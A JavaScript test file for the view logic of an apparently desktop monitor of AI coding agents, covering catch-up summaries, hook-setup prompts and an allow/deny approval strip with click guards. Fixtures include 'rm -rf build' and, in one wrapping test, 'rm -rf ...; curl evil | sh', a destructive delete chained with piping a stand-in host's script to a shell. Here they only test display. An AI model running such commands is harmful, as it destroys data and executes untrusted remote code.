import { test } from "node:test";
import assert from "node:assert/strict";

import {
  CLICK_GUARD_MS,
  HOLD_MAX_MS,
  ageText,
  approvalButtonLabel,
  approvalFor,
  approvalChoices,
  approvalLines,
  decideAccepted,
  decisionFailed,
  decisionSent,
  decisionStarted,
  decisionView,
  pruneDecisions,
  rowApproval,
  cardCatchUp,
  catchUpLines,
  collisionText,
  installedNote,
  isHeld,
  lingeringNote,
  onScrollbar,
  SETTLED_NOTE_MS,
  pressHold,
  setupView,
  statusMeta,
  trackLayout
} from "./view.js";

const NOW = 10_000_000_000;

test("ageText boundaries", () => {
  assert.equal(ageText(NOW, NOW), "just now");
  assert.equal(ageText(NOW - 59_999, NOW), "just now");
  assert.equal(ageText(NOW - 59_000, NOW), "just now");
  assert.equal(ageText(NOW - 60_000, NOW), "1m ago");
  assert.equal(ageText(NOW - 3_599_999, NOW), "59m ago");
  assert.equal(ageText(NOW - 3_600_000, NOW), "1h ago");
  assert.equal(ageText(NOW - 3 * 3_600_000 - 5, NOW), "3h ago");
});

test("ageText clamps a future timestamp to just now", () => {
  assert.equal(ageText(NOW + 5_000, NOW), "just now");
});

test("catchUpLines in order", () => {
  const lines = catchUpLines({
    original_ask: "build it",
    current_ask: "Bash: rm -rf build",
    files_since_seen: ["/r/a.rs", "/r/b.rs"],
    commands_since_seen: [
      { command: "cargo test", ok: true, at_ms: 1 },
      { command: "make", ok: false, at_ms: 2 }
    ],
    unseen: true
  });
  assert.deepEqual(lines, [
    "You asked: build it",
    "Since you looked: 2 files changed",
    "Ran: cargo test ✓",
    "Ran: make ✗",
    "Now asking: Bash: rm -rf build"
  ]);
});

test("catchUpLines caps commands at 3 then +K more", () => {
  const commands = ["c1", "c2", "c3", "c4", "c5"].map((command, i) => ({
    command,
    ok: true,
    at_ms: i
  }));
  const lines = catchUpLines({
    original_ask: null,
    current_ask: null,
    files_since_seen: [],
    commands_since_seen: commands,
    unseen: false
  });
  assert.deepEqual(lines, ["Ran: c3 ✓", "Ran: c4 ✓", "Ran: c5 ✓", "+2 more"]);
});

test("catchUpLines skips empty parts", () => {
  assert.deepEqual(
    catchUpLines({
      original_ask: null,
      current_ask: null,
      files_since_seen: [],
      commands_since_seen: [],
      unseen: false
    }),
    []
  );
  assert.deepEqual(catchUpLines(null), []);
});

test("collisionText returns null for no collisions", () => {
  assert.equal(collisionText([]), null);
  assert.equal(collisionText(undefined), null);
});

test("collisionText uses the path basename", () => {
  assert.equal(
    collisionText([{ path: "/repo/src/a.rs", other_label: "Codex · api", other_key: "codex__x" }]),
    "⚠ a.rs also edited by Codex · api"
  );
  assert.equal(
    collisionText([{ path: "C:\\repo\\src\\a.rs", other_label: "Codex · api", other_key: "codex__x" }]),
    "⚠ a.rs also edited by Codex · api"
  );
});

test("collisionText counts the extra collisions", () => {
  assert.equal(
    collisionText([
      { path: "/r/a.rs", other_label: "Codex · api", other_key: "codex__x" },
      { path: "/r/b.rs", other_label: "Codex · api", other_key: "codex__x" },
      { path: "/r/a.rs", other_label: "Claude · r #abcd", other_key: "claude__abcd" }
    ]),
    "⚠ a.rs also edited by Codex · api (+2)"
  );
});

test("statusMeta known statuses", () => {
  assert.deepEqual(statusMeta("running"), { label: "Running", symbol: "▶", className: "is-running" });
  assert.deepEqual(statusMeta("waiting_approval"), { label: "Waiting", symbol: "!", className: "is-waiting" });
  assert.deepEqual(statusMeta("completed"), { label: "Done", symbol: "✓", className: "is-completed" });
  assert.deepEqual(statusMeta("error"), { label: "Error", symbol: "×", className: "is-error" });
});

test("statusMeta falls back to idle for unknown statuses", () => {
  const idle = { label: "Idle", symbol: "−", className: "is-idle" };
  assert.deepEqual(statusMeta("idle"), idle);
  assert.deepEqual(statusMeta("bogus"), idle);
  assert.deepEqual(statusMeta(undefined), idle);
});

test("cardCatchUp keeps snapshot since-seen lists and live asks", () => {
  const snapshot = {
    original_ask: "old ask",
    current_ask: "old pending",
    files_since_seen: ["/r/a.rs"],
    commands_since_seen: [{ command: "make", ok: true, at_ms: 1 }],
    unseen: true
  };
  const live = {
    original_ask: "build it",
    current_ask: "Bash: ls",
    files_since_seen: [],
    commands_since_seen: [],
    unseen: false
  };
  assert.deepEqual(cardCatchUp(live, snapshot), {
    original_ask: "build it",
    current_ask: "Bash: ls",
    files_since_seen: ["/r/a.rs"],
    commands_since_seen: [{ command: "make", ok: true, at_ms: 1 }],
    unseen: false
  });
});

test("cardCatchUp without a snapshot is the live catch-up", () => {
  const live = {
    original_ask: "a",
    current_ask: null,
    files_since_seen: ["/x"],
    commands_since_seen: [],
    unseen: true
  };
  assert.deepEqual(cardCatchUp(live, undefined), live);
});

test("a non-interactive press never holds renders", () => {
  assert.equal(pressHold(false, NOW), null);
  assert.equal(isHeld(pressHold(false, NOW), NOW), false);
  assert.equal(isHeld(null, NOW), false);
});

test("an interactive press holds renders until it expires after 1.5 s", () => {
  assert.equal(HOLD_MAX_MS, 1500);
  const since = pressHold(true, NOW);
  assert.equal(since, NOW);
  assert.equal(isHeld(since, NOW), true);
  assert.equal(isHeld(since, NOW + 1499), true);
  assert.equal(isHeld(since, NOW + 1500), false);
  assert.equal(isHeld(since, NOW + 60_000), false);
});

test("catchUpLines says 1 file vs N files", () => {
  const base = { original_ask: null, current_ask: null, commands_since_seen: [], unseen: true };
  assert.deepEqual(catchUpLines({ ...base, files_since_seen: ["/r/a.rs"] }), [
    "Since you looked: 1 file changed"
  ]);
  assert.deepEqual(catchUpLines({ ...base, files_since_seen: ["/a", "/b", "/c"] }), [
    "Since you looked: 3 files changed"
  ]);
});

const NO_CONFIG = "No Claude Code or Codex config found (~/.claude or ~/.codex)";

test("installedNote has one /hooks line per installed provider", () => {
  const claude = "Claude: run /hooks in Claude Code to review and trust the hooks";
  const codex = "Codex: run /hooks in Codex to trust the updated hooks";
  assert.deepEqual(installedNote(["claude"]), { title: "Hooks installed", text: claude });
  assert.deepEqual(installedNote(["codex"]), { title: "Hooks installed", text: codex });
  assert.deepEqual(installedNote(["claude", "codex"]), {
    title: "Hooks installed",
    text: `${claude}\n${codex}`
  });
  assert.deepEqual(installedNote(["gemini"]), { title: "Hooks installed", text: "Gemini hooks installed" });
  assert.deepEqual(installedNote([]), { title: "No agents found", text: NO_CONFIG });
  assert.deepEqual(installedNote(undefined), { title: "No agents found", text: NO_CONFIG });
});

test("setupView asks for setup while hooks are missing", () => {
  const view = setupView(
    {
      providers: [
        { id: "claude", installed: false, status: "missing" },
        { id: "codex", installed: true, status: "current" }
      ],
      wayland: false
    },
    null
  );
  assert.deepEqual(view, {
    visible: true,
    title: "Setup needed",
    detail: "Claude hooks missing",
    wayland: false,
    button: true,
    buttonLabel: "Set up"
  });
});

test("setupView asks for an update while hooks are stale", () => {
  const view = setupView(
    { providers: [{ id: "claude", installed: false, status: "stale" }], wayland: false },
    null
  );
  assert.deepEqual(view, {
    visible: true,
    title: "Update needed",
    detail: "Claude hooks need updating",
    wayland: false,
    button: true,
    buttonLabel: "Update"
  });
});

test("setupView with one missing and one stale says both and offers Set up", () => {
  const view = setupView(
    {
      providers: [
        { id: "claude", installed: false, status: "stale" },
        { id: "codex", installed: false, status: "missing" }
      ],
      wayland: false
    },
    null
  );
  assert.equal(view.title, "Setup needed");
  assert.equal(view.detail, "Claude hooks need updating\nCodex hooks missing");
  assert.equal(view.buttonLabel, "Set up");
});

test("setupView reads a provider without a status from installed", () => {
  const view = setupView({ providers: [{ id: "codex", installed: false }], wayland: false }, null);
  assert.equal(view.detail, "Codex hooks missing");
  assert.equal(view.buttonLabel, "Set up");
  assert.equal(setupView({ providers: [{ id: "codex", installed: true }], wayland: false }, null).visible, false);
});

test("setupView explains when no agent config exists", () => {
  assert.deepEqual(setupView({ providers: [], wayland: false }, null), {
    visible: true,
    title: "No agents found",
    detail: NO_CONFIG,
    wayland: false,
    button: false,
    buttonLabel: "Set up"
  });
});

test("setupView shows a note once everything is installed, else hides", () => {
  const done = { providers: [{ id: "codex", installed: true, status: "current" }], wayland: false };
  assert.equal(setupView(done, null).visible, false);
  assert.deepEqual(setupView(done, installedNote(["codex"])), {
    visible: true,
    title: "Hooks installed",
    detail: "Codex: run /hooks in Codex to trust the updated hooks",
    wayland: false,
    button: false,
    buttonLabel: "Set up"
  });
  const wayland = setupView({ ...done, wayland: true }, null);
  assert.equal(wayland.visible, true);
  assert.equal(wayland.wayland, true);
  assert.equal(wayland.title, "Note");
  // An unreadable integrations result shows only the note, if any.
  assert.equal(setupView(null, null).visible, false);
  assert.deepEqual(setupView(null, { title: "Setup failed", text: "boom" }), {
    visible: true,
    title: "Setup failed",
    detail: "boom",
    wayland: false,
    button: false,
    buttonLabel: "Set up"
  });
});

function req(provider, session, createdMs, extra = {}) {
  return {
    id: `${provider}__${session}__${createdMs}__0123456789abcdef`,
    provider,
    session_key: session,
    label_hint: "",
    tool_name: "Bash",
    summary: "Bash: rm -rf build",
    detail: "",
    created_ms: createdMs,
    deadline_ms: createdMs + 590_000,
    ...extra
  };
}

test("approvalFor matches provider__session_key and the newest wins", () => {
  const older = req("claude", "s1", 100);
  const newer = req("claude", "s1", 300);
  const other = req("claude", "s2", 500);
  const codex = req("codex", "s1", 900);
  const list = [older, other, newer, codex];
  assert.equal(approvalFor("claude__s1", list), newer);
  assert.equal(approvalFor("claude__s1", [newer, older]), newer);
  assert.equal(approvalFor("claude__s2", list), other);
  assert.equal(approvalFor("codex__s1", list), codex);
});

test("approvalFor returns null for another session's request", () => {
  const list = [req("claude", "s1", 100), req("codex", "s2", 200)];
  assert.equal(approvalFor("claude__s2", list), null);
  assert.equal(approvalFor("claude__s", list), null);
  assert.equal(approvalFor("claude__s10", list), null);
  assert.equal(approvalFor("claude__s1", []), null);
  assert.equal(approvalFor("claude__s1", undefined), null);
});

test("rowApproval offers a decision on waiting and running rows only", () => {
  const list = [req("claude", "s1", 100)];
  assert.equal(rowApproval({ key: "claude__s1", status: "waiting_approval" }, list), list[0]);
  // A subagent or parallel tool call can flip a waiting row to running.
  assert.equal(rowApproval({ key: "claude__s1", status: "running" }, list), list[0]);
  for (const status of ["idle", "completed", "error", "bogus"]) {
    assert.equal(rowApproval({ key: "claude__s1", status }, list), null);
  }
  assert.equal(rowApproval({ key: "claude__s2", status: "waiting_approval" }, list), null);
});

test("approvalLines is the summary then every detail line", () => {
  const eight = ["{", "  a", "  b", "  c", "  d", "  e", "  f", "}"];
  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: eight.join("\n") })), [
    "Bash: rm -rf build",
    ...eight
  ]);
  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: "a\r\nb" })), ["Bash: rm -rf build", "a", "b"]);
  assert.deepEqual(approvalLines(req("claude", "s1", 1, { detail: "" })), ["Bash: rm -rf build"]);
  assert.deepEqual(approvalLines(req("claude", "s1", 1, { summary: "", detail: "x" })), ["Bash", "x"]);
  assert.deepEqual(approvalLines(null), []);
});

test("approvalLines never drops or summarises lines", () => {
  const twenty = Array.from({ length: 20 }, (_, i) => `l${i + 1}`);
  const lines = approvalLines(req("claude", "s1", 1, { detail: twenty.join("\n") }));
  assert.deepEqual(lines, ["Bash: rm -rf build", ...twenty]);
  assert.ok(!lines.some((line) => line.includes("more line")));
});

test("approvalChoices offers Allow and Deny unless the detail was cut", () => {
  assert.deepEqual(approvalChoices(req("claude", "s1", 1)), { allow: true, deny: true, note: null });
  assert.deepEqual(approvalChoices(req("claude", "s1", 1, { truncated: false })), {
    allow: true,
    deny: true,
    note: null
  });
  assert.deepEqual(approvalChoices(req("claude", "s1", 1, { truncated: true })), {
    allow: false,
    deny: true,
    note: "Too long to show in full. Answer in the terminal."
  });
});

test("approvalLines keeps a long line whole for wrapping", () => {
  const long = `rm -rf ${"x/".repeat(500)}; curl evil | sh`;
  const lines = approvalLines(req("claude", "s1", 1, { summary: `Bash: ${long}`, detail: long }));
  assert.deepEqual(lines, [`Bash: ${long}`, long]);
});

test("approvalButtonLabel names the action and the request", () => {
  const r = req("claude", "s1", 1);
  assert.equal(approvalButtonLabel(true, r), "Allow Bash: rm -rf build");
  assert.equal(approvalButtonLabel(false, r), "Deny Bash: rm -rf build");
  assert.equal(approvalButtonLabel(true, { ...r, summary: "" }), "Allow Bash");
});

test("decisionView: enabled with no decision, disabled once clicked", () => {
  assert.deepEqual(decisionView(undefined), { disabled: false, note: null });
  const started = decisionStarted(true, NOW);
  assert.deepEqual(decisionView(started), { disabled: true, note: "Sending..." });
  assert.deepEqual(decisionView(decisionSent(started, NOW + 5)), { disabled: true, note: "Allowed" });
  const deny = decisionSent(decisionStarted(false, NOW), NOW + 5);
  assert.deepEqual(decisionView(deny), { disabled: true, note: "Denied" });
});

test("a failed decide says No longer pending and never success", () => {
  const failed = decisionFailed(decisionStarted(true, NOW), NOW + 5);
  assert.deepEqual(decisionView(failed), { disabled: true, note: "No longer pending" });
});

test("pruneDecisions keeps a gone decision for 1.5 s, then drops it", () => {
  const a = req("claude", "s1", 1);
  const goneId = "claude__gone__1__0123456789abcdef";
  const decisions = new Map([
    [a.id, decisionStarted(true, NOW, "claude__s1")],
    [goneId, decisionSent(decisionStarted(true, NOW, "claude__gone"), NOW + 1)]
  ]);
  const first = pruneDecisions(decisions, [a], NOW + 10);
  assert.deepEqual([...first.keys()], [a.id, goneId]);
  assert.equal(first.get(a.id).goneMs, null);
  assert.equal(first.get(goneId).goneMs, NOW + 10);
  // The grace counts from when the request was first seen gone.
  const later = pruneDecisions(first, [a], NOW + 1509);
  assert.equal(later.get(goneId).goneMs, NOW + 10);
  assert.deepEqual([...pruneDecisions(later, [a], NOW + 1510).keys()], [a.id]);
  assert.equal(SETTLED_NOTE_MS, 1500);
});

test("a gone decision is never re-enabled and shows note-only", () => {
  const sent = decisionSent(decisionStarted(false, NOW, "claude__s1"), NOW + 5);
  const gone = pruneDecisions(new Map([["x", sent]]), [], NOW + 10);
  assert.deepEqual(decisionView(gone.get("x")), { disabled: true, note: "Denied" });
  assert.equal(lingeringNote("claude__s1", gone), "Denied");
  assert.equal(lingeringNote("claude__s2", gone), null);
  // While the request is still listed the strip shows it, not a lingering note.
  const listed = pruneDecisions(new Map([["x", sent]]), [{ id: "x" }], NOW + 10);
  assert.equal(lingeringNote("claude__s1", listed), null);
  assert.equal(lingeringNote("claude__s1", new Map()), null);
  const failed = pruneDecisions(
    new Map([["y", decisionFailed(decisionStarted(true, NOW, "claude__s1"), NOW + 5)]]),
    [],
    NOW + 10
  );
  assert.equal(lingeringNote("claude__s1", failed), "No longer pending");
});

test("lingeringNote picks the newest gone decision for the row", () => {
  const older = { ...decisionSent(decisionStarted(true, NOW, "k"), NOW + 1), goneMs: NOW + 2 };
  const newer = { ...decisionSent(decisionStarted(false, NOW + 100, "k"), NOW + 101), goneMs: NOW + 102 };
  assert.equal(lingeringNote("k", new Map([["a", older], ["b", newer]])), "Denied");
  assert.equal(lingeringNote("k", new Map([["b", newer], ["a", older]])), "Denied");
});

test("onScrollbar: a press right of the client area is on the scrollbar", () => {
  assert.equal(onScrollbar(100, 208), false);
  assert.equal(onScrollbar(207.5, 208), false);
  assert.equal(onScrollbar(208, 208), true);
  assert.equal(onScrollbar(215, 208), true);
});

test("pruneDecisions keeps a decision, shown and disabled, while its request is listed", () => {
  const a = req("claude", "s1", 1);
  const inFlight = new Map([[a.id, decisionStarted(true, NOW)]]);
  assert.equal(pruneDecisions(inFlight, [a], NOW + 5000).size, 1);
  const sent = new Map([[a.id, decisionSent(decisionStarted(false, NOW), NOW + 100)]]);
  for (const at of [NOW + 50, NOW + 101, NOW + 60_000]) {
    const kept = pruneDecisions(sent, [a], at);
    assert.equal(kept.size, 1);
    assert.deepEqual(decisionView(kept.get(a.id)), { disabled: true, note: "Denied" });
  }
  assert.equal(pruneDecisions(sent, [], NOW + 101).size, 1);
});

test("pruneDecisions never re-enables a failed decide while its request is listed", () => {
  const a = req("claude", "s1", 1);
  const failed = new Map([[a.id, decisionFailed(decisionStarted(false, NOW), NOW + 100)]]);
  assert.equal(pruneDecisions(failed, [a], NOW + 10_000).size, 1);
  const gone = pruneDecisions(failed, [], NOW + 10_000);
  assert.equal(gone.size, 1);
  assert.deepEqual(decisionView(gone.get(a.id)), { disabled: true, note: "No longer pending" });
  assert.equal(pruneDecisions(gone, [], NOW + 11_500).size, 0);
});

test("pruneDecisions does not mutate its input", () => {
  const a = req("claude", "s1", 1);
  const decisions = new Map([[a.id, decisionStarted(true, NOW)]]);
  pruneDecisions(decisions, [], NOW);
  pruneDecisions(decisions, [], NOW + 60_000);
  assert.equal(decisions.size, 1);
  assert.equal(decisions.get(a.id).goneMs, null);
});

const SHOWN = [req("claude", "s1", 1), req("codex", "s2", 2)];

test("a decide click is rejected until its request has been shown for 500 ms", () => {
  const [a] = SHOWN;
  let tracker = trackLayout(null, [a.id], ["claude__s1"], NOW);
  assert.equal(decideAccepted(tracker, a.id, NOW), false);
  assert.equal(decideAccepted(tracker, a.id, NOW + CLICK_GUARD_MS - 1), false);
  tracker = trackLayout(tracker, [a.id], ["claude__s1"], NOW + 400);
  assert.equal(decideAccepted(tracker, a.id, NOW + CLICK_GUARD_MS), true);
  assert.equal(decideAccepted(tracker, a.id, NOW + 60_000), true);
});

test("a decide click is rejected for 500 ms after the approvals or the row order changes", () => {
  const [a, b] = SHOWN;
  let tracker = trackLayout(null, [a.id], ["claude__s1"], NOW);
  tracker = trackLayout(tracker, [a.id], ["claude__s1"], NOW + 5000);
  assert.equal(decideAccepted(tracker, a.id, NOW + 5000), true);
  // A second request appears: the old button may have moved.
  tracker = trackLayout(tracker, [a.id, b.id], ["claude__s1", "codex__s2"], NOW + 6000);
  assert.equal(decideAccepted(tracker, a.id, NOW + 6100), false);
  assert.equal(decideAccepted(tracker, b.id, NOW + 6100), false);
  assert.equal(decideAccepted(tracker, a.id, NOW + 6500), true);
  assert.equal(decideAccepted(tracker, b.id, NOW + 6500), true);
  // Row order changes.
  tracker = trackLayout(tracker, [a.id, b.id], ["codex__s2", "claude__s1"], NOW + 7000);
  assert.equal(decideAccepted(tracker, a.id, NOW + 7499), false);
  assert.equal(decideAccepted(tracker, a.id, NOW + 7500), true);
  // An unchanged layout does not restart the clock; a gone request is forgotten.
  tracker = trackLayout(tracker, [a.id, b.id], ["codex__s2", "claude__s1"], NOW + 9000);
  assert.equal(decideAccepted(tracker, a.id, NOW + 9000), true);
  tracker = trackLayout(tracker, [b.id], ["codex__s2"], NOW + 9100);
  assert.equal(decideAccepted(tracker, a.id, NOW + 20_000), false);
});

test("trackLayout does not mutate its input", () => {
  const [a] = SHOWN;
  const first = trackLayout(null, [a.id], ["claude__s1"], NOW);
  const copy = JSON.stringify([...first.firstSeen]);
  trackLayout(first, [], [], NOW + 10);
  assert.equal(JSON.stringify([...first.firstSeen]), copy);
});
